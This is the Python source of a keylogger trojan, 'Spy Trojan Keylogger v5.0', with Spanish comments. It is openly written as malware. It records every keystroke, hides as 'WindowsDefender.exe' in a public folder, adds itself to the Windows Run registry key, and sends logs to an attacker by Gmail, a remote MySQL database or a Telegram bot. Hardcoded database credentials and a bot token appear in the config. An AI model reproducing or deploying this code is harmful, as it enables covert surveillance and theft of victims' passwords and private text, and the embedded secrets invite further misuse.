# ░██████╗██████╗░██╗░░░██╗  ████████╗██████╗░░█████╗░░░░░░██╗░█████╗░███╗░░██╗
# ██╔════╝██╔══██╗╚██╗░██╔╝  ╚══██╔══╝██╔══██╗██╔══██╗░░░░░██║██╔══██╗████╗░██║
# ╚█████╗░██████╔╝░╚████╔╝░  ░░░██║░░░██████╔╝██║░░██║░░░░░██║███████║██╔██╗██║
# ░╚═══██╗██╔═══╝░░░╚██╔╝░░  ░░░██║░░░██╔══██╗██║░░██║██╗░░██║██╔══██║██║╚████║
# ██████╔╝██║░░░░░░░░██║░░░  ░░░██║░░░██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░╚███║
# ╚═════╝░╚═╝░░░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝

# ██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
# ██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
# █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
# ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
# ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v5.0

#region import Libs
from pynput.keyboard import Listener
from getpass import getuser     # Obtiene el nombre del usuario
from datetime import datetime   # Devuelve fecha y hora actual
from winreg import *            # Modifica registros de Windows
import datetime                 # Devuelve fecha y hora actual
import random                   # Genera numeros
import os                       # Lib para copiar archivos
import telebot                  # Telegram API
import yagmail                  # Enviar archivos solo a Gmail
import pymysql                  # Lib connection mysql
import shutil                   # Lib para crear carpetas
import string                   # Lib genera textos
import time
import threading                # Hilos
import socket                   # Librería verifica internet
#endregion

class Config:
    def __init__(self):
        self.NAME_KEY = "WindowsDefender"+ ".exe"   # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
        self.NAME_STARTUP = "Windows Defeder REG"                                   # Nombre del Keylogger en el registro
        self.PATH_OCULT = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"    # Ruta donde se esconderá el KEYLOGGER
        self.PATH_KEY = self.PATH_OCULT+self.NAME_KEY                               # <No cambiar>
        self.PATH_LOG = self.LOG_KEY_PATH+self.LOG_NAME
        self.LOG_KEY_PATH = "C:\\Users\\Public\\Security\\Settings"+ "\\"           # Ruta del Registro de teclas
        self.LOG_NAME = "reg"+ "." + "k"                                            # Nombre y extensión del registro
        # Importante
        self.TIMESEND = 5 #[minutos]                                                # Tiempo de envió del registro
        self.MODE = 2     # 0 = Gmail
                          # 1 = DataBase                                            # Solo se puede usar una opción
                          # 2 = TelegramBot
    class DataBase:  # Clase de Base de datos
        def __init__(self):
            self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
            self.USERNAME = "udwlsyrbtldkznqo"                                      # Username
            self.PASSWORD = "OR2i2dfdgWek0UDiAv4f"                                  # Password
            self.DATABASE = "bh1g5gnxzw2igrvui8hq"                                  # DataBase Name
            self.PORT     = "3306"                                                  # Port
    class Gmail:
        def __init__(self):
            self.GMAIL_1 = "correo1@gmail.com"
            self.PASS_1  = "password1"
            self.GMAIL_2 = "correo2@gmail.com"
            self.PASS_2  = "password2"
            self.GMAIL_3 = "correo3@gmail.com"
            self.PASS_3  = "password3"
          # Solo un correo Recibirá el Registro de Teclas
            self.RECEIVERS = ["receivers1@yahoo.com"]
          # Correos que recibiran el Registro de teclas, pueden ser de 1 a muchos
          # self.RECEIVERS = ["receivers1@yahoo.com","receivers2@gmail.com","receivers3@hotmail.com"]
    class TelegramBot:
        def __init__(self):
            self.ID   = 831756900                                                     # ID Principal [Obligatorio]
            self.ID_2 = 000000000                                                     # ID secundario [Opcional]
            self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
            self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"             # TOKEN de tu Bot [Obligatorio]


class Functions:
    def CheckFolder_StartUP(self):  # Función especial para el startUp
        try:    # Intenta crear la dirección
            os.makedirs("C:\\Users\\Public\\Security\\Microsoft")   # Carpeta especial de verificación de startup <No cambiar si no sabe lo que es>
            return True     # Se creó la carpeta
        except:
            return False    # La carpeta ya existe
        pass

    def RandomChar(self,y=100):
        return ''.join(random.choice(string.ascii_letters) for x in range(y))

    # Función = Verifica si hay conexión a internet para poder envíar el log
    def VerifyConnection(self):
        con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          # Creamos el socket de conexion
        try:                                                            # Intenta conectarse al servidor de Google
            con.connect(('www.google.com', 80))
            con.close()
            print("[Test Internet] => [OK]")
            return True
        except:
            print("[Test Internet] => [NO]")
            return False

    def SendGmail(self, file, email, password, receiver_email):
        try:
            f = datetime.datetime.now()
            subject = "Data User: " + str(getuser())
            # Inicia Sesión
            yag = yagmail.SMTP(user=email, password=password)
            informacion = "\nFecha: " + f.strftime("%A") + " " + f.strftime("%d") + " de " + f.strftime(
                "%B") + "\nHora: " + f.strftime("%I") + ":" + f.strftime("%M") + " " + f.strftime(
                "%p") + " con " + f.strftime("%S") + " Segundos"
            # Cuerpo del mensaje
            contents = [
                "Información:\n\nNombre de Usuario: " + str(getuser()) + informacion
            ]
            yag.send(receiver_email, subject, contents, attachments=file)
            print("[SendGmail] ["+email+"] Se envió el Registro de teclas correctamente")
            return True
        except:
            print("[SendGmail] ["+email+"] No se pudo envíar el Registro de teclas")
            return False

    def RamdomLogNamePATH(self):
        return Config().LOG_KEY_PATH + Functions().RandomChar(23) + ".txt"

    def CurrentTime(self):
        T = datetime.datetime.now()
        return T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime("%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")

class Util:
    def __init__(self): #Constructor?
        pass

    def CreateFolders(self):    # Crea el directorio oculto
        try:  # Intenta crear la dirección
            os.makedirs(Config().PATH_OCULT)
            print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_OCULT)
        except:
            print("[CreateFolders] - La carpeta ya existe: "+ Config().PATH_OCULT)
        try:  # Intenta crear la dirección del registro de teclas..
            os.makedirs(Config().PATH_KEY)
            print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_KEY)
        except:
            print("[CreateFolders] - La carpeta ya existe: " + Config().PATH_KEY)

    def RenameFileKey(self,name): # Renombre el archivo log, antes de ser envíado
        try:
            self.CreateFolders()  # Crea el directorios [Evita posibles errores]
            # Copia el archivo
            path = Config().LOG_KEY_PATH+ name
            os.rename(Config().PATH_LOG, path)
            print("El archivo reg.k se renombró correctamente")
        except:
            print("No se puedo renombrar el archivo 'reg.k' ")
            pass

    def addStartUp(self):
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        try:    # Solo si tiene permisos de administrador
            registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)  # machine
            SetValueEx(registry, Config().NAME_STARTUP, 0, REG_SZ, Config().PATH_KEY)
            Functions.CheckFolder_StartUP() # Crea carpeta
        except:
            if Functions.CheckFolder_StartUP():
                registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)  # local
                SetValueEx(registry, Config().NAME_STARTUP, 0, REG_SZ, Config().PATH_KEY)

    def Trojan(self):   # Se Replica en el sistema
        self.CreateFolders()
        try:
            with open(Config().PATH_KEY, 'r') as f:  # Verifica si el keylogger se encuentra oculto en el sistema
                print("[Trojan] - Ya se encuentra en el sistema : \n" + Config().PATH_KEY)
        except:
            print("[Trojan] - No se encuentra en el sistema...\nProceso Troyano...")
            try:
                shutil.copy(Config().NAME_KEY, Config().PATH_KEY)  # Intenta ocultar el keylogger en una carpeta
                print("\n[Trojan] - Se replico en el sistema correctamente")
            except:
                print("\n[Trojan] - Hubo un problema al replicar en el sistema")
    # Envía los datos reg.k vía Gmail
    def SendGmail(self):
        # Crea nombre del archivo
        nameFile = Functions().RamdomLogNamePATH()
        # Renombra el archivo original
        self.RenameFileKey(nameFile) # Cambia el archivo `reg.k` a  `user - 234bkhj4b23k4g23vj43.txt`

        # Envía el archivo renombrado
        self.CreateFolders()
        homedir = Config().LOG_KEY_PATH + str(nameFile)
        print("[Gmail send] Proceso de envío...")

        if Functions.SendGmail(homedir, Config.Gmail().GMAIL_1, Config.Gmail().PASS_1, Config.Gmail().RECEIVERS):
            os.remove(homedir)

        elif Functions.SendGmail(homedir, Config.Gmail().GMAIL_2, Config.Gmail().PASS_2, Config.Gmail().RECEIVERS):
            os.remove(homedir)

        elif Functions.SendGmail(homedir, Config.Gmail().GMAIL_3, Config.Gmail().PASS_3, Config.Gmail().RECEIVERS):
            os.remove(homedir)

    def TelegramBot(self):
        try:
            print("[TelegramBot] Proceso...")
            pathN = Functions().RamdomLogNamePATH()
            os.rename(Config().PATH_LOG, self.NewPathLog)
            # Abre el archivo
            f = open(pathN, 'r')
            T = datetime.datetime.now()
            currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
                "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
            def SendT(ID):
                bot = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
                bot.send_message(ID,"Usuario: " + str(getuser()) + "\nFecha: " + currentTime + "\n=>\n=>\n" + f.read())
                print("[TelegramBot] Se obtuvo el registro de teclas y se envió a Telegram [ID] =" + str(ID))
            try:
                if Config.TelegramBot().ID_2 != 000000000:
                    SendT(Config.TelegramBot().ID)

                if Config.TelegramBot().ID_2 != 000000000:
                    SendT(Config.TelegramBot().ID_2)

                if Config.TelegramBot().ID_3 != 000000000:
                    SendT(Config.TelegramBot().ID_3)

                f.close()
                os.remove(pathN)
                print("[TelegramBot] Se eliminó el archivo caché correctamente")
            except:
                print("[Telegram] Error al subir el registro")
        except:
            try:
                f.close()
                os.remove(pathN)  # Borra la carpeta por posible Errores
            except:
                pass
            print("[Telegram] No se encuentra el archivo")

    def MySQL(self):
        exito = False
        try:  # Verifica si se inició corectamente
            connection = pymysql.connect(
                host=Config.DataBase().HOSTNAME,
                user=Config.DataBase().USERNAME,
                password=Config.DataBase().PASSWORD,
                database=Config.DataBase().DATABASE)
            cursor = connection.cursor()  # Objeto cursor
            print("Se inició correctamente ")
            exito = True
        except:
            exito = False
            print("Error al iniciar sesión [DataBase]")

        def UpdateUser():
            try:
                pathN = Functions().RamdomLogNamePATH()
                os.rename(Config().PATH_LOG, pathN)
                # Abre el archivo
                f = open(pathN, 'r')
                data = f.read()
                f.close()
                print(data)
                # Tiempo
                T = datetime.datetime.now()
                currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
                    "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
                sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES(%s,%s,%s)"
                try:
                    cursor.execute(sql, (str(getuser()), currentTime, data))  # Ejecuta virtual
                    connection.commit()  # Se guardan virtual
                    print("[Database] Se subieron los datos correctamente")
                    # Elimina Registro Key
                    connection.close()
                    os.remove(pathN)
                except:
                    print("[Database] Error al subir los datos")

            except:
                try:
                    os.remove(pathN)  # Borra la carpeta por posible Errores
                except:
                    pass
                print("[DataBase] No se encuentra el archivo")

        if (exito):  # Solo se ejecutará si se inició correctamente la base de datos
            print("[DataBase]=> " + str(exito))
            UpdateUser()


class Keylogger:
    def __init__(self):
        pass
    # Convierte tecla a un valor legible
    def KeyConMin(self, numberKey):                # Caracteres Comunes // Optimizados
        switcher = {
            # Vocales Minisculas
            "'a'": "a",
            "'e'": "e",
            "'i'": "i",
            "'o'": "o",
            "'u'": "u",
            # Letras  Minusculas
            "'b'": "b",
            "'c'": "c",
            "'d'": "d",
            "'f'": "f",
            "'g'": "g",
            "'h'": "h",
            "'j'": "j",
            "'J'": "J",
            "'k'": "k",
            "'l'": "l",
            "'m'": "m",
            "'n'": "n",
            "'ñ'": "ñ",
            "'p'": "p",
            "'q'": "q",
            "'r'": "r",
            "'s'": "s",
            "'t'": "t",
            "'v'": "v",
            "'w'": "w",
            "'x'": "x",
            "'y'": "y",
            "'z'": "z",
            # Caracteres
            "','": ",",                     # ,
            "'.'": ".",                     # .
            "'_'": "_",                     # _
            "'-'": "-",                     # -
            "':'": ":",                     #
            # Vocales Mayúsculas
            "'A'": "A",
            "'E'": "E",
            "'I'": "I",
            "'O'": "O",
            "'U'": "U",
            # Letras Mayúsculas
            "'B'": "B",
            "'C'": "C",
            "'D'": "D",
            "'F'": "F",
            "'G'": "G",
            "'H'": "H",
            "'K'": "K",
            "'L'": "L",
            "'M'": "M",
            "'N'": "N",
            "'Ñ'": "Ñ",
            "'P'": "P",
            "'Q'": "Q",
            "'R'": "R",
            "'S'": "S",
            "'T'": "T",
            "'V'": "V",
            "'W'": "W",
            "'X'": "X",
            "'Y'": "Y",
            "'Z'": "Z",
            # Números Standard
            "'1'": "1",
            "'2'": "2",
            "'3'": "3",
            "'4'": "4",
            "'5'": "5",
            "'6'": "6",
            "'7'": "7",
            "'8'": "8",
            "'9'": "9",
            "'0'": "0",
            # Caracteres Especiales
            "'@'": "@",                     # @
            "'#'": "#",                     # #
            "'*'": "*",                     # *
            "'('": "(",                     # (
            "')'": ")",                     # )
            '"\'"': "'",                    # '
            "'\"'": '"',                    # "
            "'?'": "?",                     # ?
            "'='": "=",                     # =
            "'+'": "+",                     # +
            "'!'": "!",                     # !
            "'}'": "}",                     # }
            "'{'": "{",                     # {}
            "'´'": "´",                     # ´
            "'|'": "|",                     # |
            "'°'": "°",                     # °
            "'^'": "¬",                     # ^
            "';'": ";",                     #
            "'$'": "$",                     # $
            "'%'": "%",                     # %
            "'&'": "&",                     # &
            "'>'": ">",                     #
            "'<'": "<",                     #
            "'/'": "/",                     # /
            "'¿'": "¿",                     # ¿
            "'¡'": "¡",                     # ¡
            "'~'": "~"                      #
        }
        return switcher.get(numberKey, "")

    # Convierte tecla a un valor legible
    def KeyConMax(self, numberKey):  # Botones, comunes // Optimizados
        switcher = {
            "Key.space": " ",  # Espacio
            "Key.backspace": "«",  # Borrar
            "Key.enter": "\n",  # Salto de linea
            "Key.tab": "    ",  # Tabulación
            "Key.delete": " «×» ",  # Suprimir
            # Números
            "<96>": "0",  # 0
            "<97>": "1",  # 1
            "<98>": "2",  # 2
            "<99>": "3",  # 3
            "<100>": "4",  # 4
            "<101>": "5",  # 5
            "<102>": "6",  # 6
            "<103>": "7",  # 7
            "<104>": "8",  # 8
            "<105>": "9",  # 9
            # Números Númeral
            "None<96>": "0",  # 0
            "None<97>": "1",  # 1
            "None<98>": "2",  # 2
            "None<99>": "3",  # 3
            "None<100>": "4",  # 4
            "None<101>": "5",  # 5
            "None<102>": "6",  # 6
            "None<103>": "7",  # 7
            "None<104>": "8",  # 8
            "None<105>": "9",  # 9
            # Teclas raras 2
            "['^']": "^",
            "['`']": "`",  #
            "['¨']": "¨",  #
            "['´']": "´",  #
            "<110>": ".",  #
            "None<110>": ".",  #
            "Key.alt_l": " [AltL] ",  #
            "Key.alt_r": " [AltR] ",
            "Key.shift_r": " [ShiftR] ",
            "Key.shift": " [ShiftL] ",
            "Key.ctrl_r": " [CtrlR] ",  #
            "Key.ctrl_l": " [CtrlL] ",  #
            "Key.right": " [Right] ",  #
            "Key.left": " [Left] ",  #
            "Key.up": " [Up]",  #
            "Key.down": " [Down] ",  #
            # "'\x16'"  : " [Pegó] ",
            # "'\x18'"  : " [Cortar] ",
            # "'\x03'"  : " [Copiar] ",
            "Key.caps_lock": " [MayusLock] ",
            # "Key.media_previous"    : " ♫ ",     #
            # "Key.media_next"        : " ♫→ ",         #
            # "Key.media_play_pause"  : " ■ ♫ ■ ",#
            "Key.cmd": " [W] "  #
        }
        return switcher.get(numberKey, "")

    def GetKeys(self):

        try:  # Intenta crear el archivo
            log = os.environ.get('pylogger_file', os.path.expanduser(Config().PATH_KEY))
            with open(log, "a") as f:
                f.write(
                    "")  # \n--------------------------------------------\nUserName:   ["+str(getuser()) +"]\n"+ str(getTime)+"--------------------------------------------\n\n")
        except:  # Si no puede crear el archivo, crea el directorio faltante
            Util.CreateFolders()  # Function: Crea el directorio Ejemplo: ==> C:\Users\Public\Security\Windows Defender

        def on_press(key):
            with open(log, "a") as f:
                # print(str(key)) <= habilitar Solo antiDebug
                if (len(str(key))) <= 3:
                    print("Se oprimio la tecla: " + self.KeyConMin(str(key)))
                    f.write(self.KeyConMin(str(key)))
                else:
                    print("Se oprimio la tecla: " + self.KeyConMax(str(key)) )
                    f.write(self.KeyConMax(str(key)))

        with Listener(on_press=on_press) as listener:  # Escucha pulsaciones de teclas
            listener.join()

#if __name__ == '__main__':

   # p1 = threading.Thread(target=k)  # Registra teclas
f = Config()
print("sdf"+f.Gmail().GMAIL_1)







